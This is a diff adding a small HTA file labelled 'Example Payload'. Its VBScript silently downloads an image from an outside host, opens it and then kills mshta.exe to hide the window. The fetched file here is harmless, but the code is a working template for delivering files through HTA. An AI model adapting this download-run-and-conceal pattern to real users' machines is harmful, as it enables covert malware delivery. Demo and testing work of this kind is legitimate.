@@ -1,0 +1,13 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+
+        <HTA:APPLICATION APPLICATIONNAME="Example Payload" ID="Example Payload" VERSION="1.0" BORDER="none" WINDOWSTATE="minimize"/>
+        <script language="VBScript">
+            Set shell = CreateObject("Wscript.shell")
+            shell.Run "cmd /c curl https://n643064.github.io/cat.png -o %userprofile%\cat.png ", false, true
+            shell.Run "cmd /c start %userprofile%\cat.png ", false, true
+            shell.Run "taskkill /f /im mshta.exe", false, true
+        </script>
+    </head>
+</html>
